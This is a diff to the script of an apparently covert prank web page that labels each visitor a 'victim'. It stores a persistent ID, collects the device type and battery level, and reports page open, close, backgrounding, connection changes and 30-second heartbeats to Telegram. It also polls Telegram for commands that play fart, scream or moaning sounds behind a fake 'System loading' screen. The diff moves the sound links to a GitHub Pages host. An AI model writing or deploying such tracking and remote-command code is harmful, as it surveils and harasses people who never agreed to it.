@@ -44,13 +44,16 @@
         let heartbeatInterval;
         
         // =============================================
+        // BASE URL FOR YOUR SOUNDS - UPDATED!
+        // =============================================
+        const SOUND_BASE_URL = 'https://sencall1125-prog.github.io/sen/';
+        
+        // =============================================
         // GENERATE UNIQUE VICTIM ID
         // =============================================
         function generateVictimId() {
-            // Try to get existing ID from localStorage
             let id = localStorage.getItem('victim_id');
             if (!id) {
-                // Create new random ID
                 id = 'victim_' + Math.random().toString(36).substring(2, 15) + 
                      Math.random().toString(36).substring(2, 15);
                 localStorage.setItem('victim_id', id);
@@ -81,7 +84,6 @@
             const now = new Date();
             const timeString = now.toLocaleTimeString();
             
-            // Get device info
             const userAgent = navigator.userAgent;
             let device = 'Unknown';
             if (userAgent.includes('iPhone')) device = '📱 iPhone';
@@ -89,14 +91,10 @@
             else if (userAgent.includes('Windows')) device = '💻 Windows';
             else if (userAgent.includes('Mac')) device = '🍎 Mac';
             
-            // Get battery info if available
-            let batteryInfo = '';
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     const level = Math.round(battery.level * 100);
-                    batteryInfo = ` | Battery: ${level}%`;
                     
-                    // Send final message with battery
                     sendTelegramMessage(
                         `✅ **VICTIM ONLINE**\n` +
                         `🆔 ${victimId}\n` +
@@ -106,7 +104,6 @@
                     );
                 });
             } else {
-                // Send without battery info
                 sendTelegramMessage(
                     `✅ **VICTIM ONLINE**\n` +
                     `🆔 ${victimId}\n` +
@@ -119,25 +116,23 @@
         }
         
         // =============================================
-        // HEARTBEAT - DETECT IF STILL CONNECTED
+        // HEARTBEAT
         // =============================================
         function startHeartbeat() {
-            // Send heartbeat every 30 seconds
             heartbeatInterval = setInterval(() => {
                 sendTelegramMessage(`💓 **HEARTBEAT** | Victim still connected | ID: ${victimId}`);
-                console.log('Heartbeat sent');
-            }, 30000); // 30 seconds
+            }, 30000);
         }
         
         // =============================================
-        // DETECT WHEN PAGE CLOSES
+        // DETECT PAGE CLOSE
         // =============================================
         function onPageClose() {
             sendTelegramMessage(`❌ **VICTIM DISCONNECTED** | ID: ${victimId} | Page closed`);
         }
         
         // =============================================
-        // DETECT WHEN PAGE GOES TO BACKGROUND
+        // DETECT PAGE HIDDEN
         // =============================================
         function onPageHidden() {
             if (document.hidden) {
@@ -150,7 +145,7 @@
         }
         
         // =============================================
-        // UNLOCK AUDIO ON IPHONE
+        // UNLOCK AUDIO
         // =============================================
         function unlockAudio() {
             const silentAudio = new Audio('data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTG9uZG9uU291bmRzLmNvbQAAAFRSSUNLAAAAHwAAAEFkb2JlIEZBUiBKYW5zIFBlbmd1aW4gU3R1ZGlvAAAA/UpLSUkAAAAvAAAALWFjYWNhAGIAbwBvAGsAIAB0AHkAcABlACAAYwBvAGQAZQAgAHAAYQBnAGUAAAAA');
@@ -191,7 +186,7 @@
         }
         
         // =============================================
-        // PLAY SOUND BASED ON COMMAND
+        // PLAY SOUND - USING YOUR GITHUB LINKS
         // =============================================
         function playSound(command) {
             let audio;
@@ -199,50 +194,64 @@
             
             switch(command.toLowerCase()) {
                 case '/fart':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/fart-with-reverb.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'fart.mp3');
                     statusMessage = '💨 System flatulence detected...';
                     break;
+                    
                 case '/scream':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/wilhelm-scream.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'scream.mp3');
                     statusMessage = '⚠️ AAAAAHHHHH!';
                     break;
+                    
                 case '/vomit':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/vomit-sound.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'vomit.mp3');
                     statusMessage = '🤢 System malfunction... *urp*';
                     break;
+                    
                 case '/error':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/windows-xp-error.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'error.mp3');
                     statusMessage = '🔴 CRITICAL ERROR DETECTED';
                     break;
+                    
                 case '/moan':
                 case '/moaning':
-                    audio = new Audio('https://senpai-loading.github.io/sen/moaning'); // Adjust extension
+                    audio = new Audio(SOUND_BASE_URL + 'moaning.mp3');
                     statusMessage = '😏 Uhhhh... someone\'s enjoying that...';
                     break;
+                    
                 case '/bruh':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/bruh-sound-effect.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'bruh.mp3');
                     statusMessage = '🤨 Bruh...';
                     break;
+                    
                 case '/roblox':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/roblox-death-sound_1.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'roblox.mp3');
                     statusMessage = '💀 OOF!';
                     break;
+                    
                 case '/metalpipe':
-                    audio = new Audio('https://www.myinstants.com/media/sounds/metal-pipe-sound.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
                     statusMessage = '🏗️ BONGGGGG!';
                     break;
+                    
                 case '/random':
                     const randomSounds = [
-                        'https://www.myinstants.com/media/sounds/fart-with-reverb.mp3',
-                        'https://www.myinstants.com/media/sounds/wilhelm-scream.mp3',
-                        'https://senpai-loading.github.io/sen/moaning'
+                        'fart.mp3',
+                        'scream.mp3',
+                        'vomit.mp3',
+                        'error.mp3',
+                        'moaning.mp3',
+                        'bruh.mp3',
+                        'roblox.mp3',
+                        'metalpipe.mp3'
                     ];
                     const randomIndex = Math.floor(Math.random() * randomSounds.length);
-                    audio = new Audio(randomSounds[randomIndex]);
+                    audio = new Audio(SOUND_BASE_URL + randomSounds[randomIndex]);
                     statusMessage = '🎲 Random sound!';
                     break;
+                    
                 default:
-                    audio = new Audio('https://www.myinstants.com/media/sounds/metal-pipe-sound.mp3');
+                    audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
                     statusMessage = '❓ Unknown command... here\'s a sound anyway!';
             }
             
@@ -286,7 +295,11 @@
                             !statusElement.innerHTML.includes('⚠️') &&
                             !statusElement.innerHTML.includes('🤢') &&
                             !statusElement.innerHTML.includes('🔴') &&
-                            !statusElement.innerHTML.includes('😏')) {
+                            !statusElement.innerHTML.includes('😏') &&
+                            !statusElement.innerHTML.includes('🤨') &&
+                            !statusElement.innerHTML.includes('💀') &&
+                            !statusElement.innerHTML.includes('🏗️') &&
+                            !statusElement.innerHTML.includes('🎲')) {
                             statusElement.innerHTML = 'System loading... 0%';
                             updateProgress();
                         }
@@ -301,22 +314,14 @@
         }
         
         // =============================================
-        // SETUP ALL DETECTORS
+        // SETUP
         // =============================================
         
-        // Detect when page opens
         onPageOpen();
-        
-        // Start heartbeat
         startHeartbeat();
-        
-        // Detect when page closes
         window.addEventListener('beforeunload', onPageClose);
-        
-        // Detect when page goes to background
         document.addEventListener('visibilitychange', onPageHidden);
         
-        // Detect connection changes
         window.addEventListener('online', function() {
             sendTelegramMessage(`✅ **CONNECTION RESTORED** | ID: ${victimId} | Internet back online`);
         });
@@ -325,10 +330,7 @@
             sendTelegramMessage(`⚠️ **CONNECTION LOST** | ID: ${victimId} | No internet connection`);
         });
         
-        // Unlock audio
         unlockAudio();
-        
-        // Start Telegram checks
         updateProgress();
         setInterval(checkTelegram, 3000);
         setTimeout(checkTelegram, 1000);
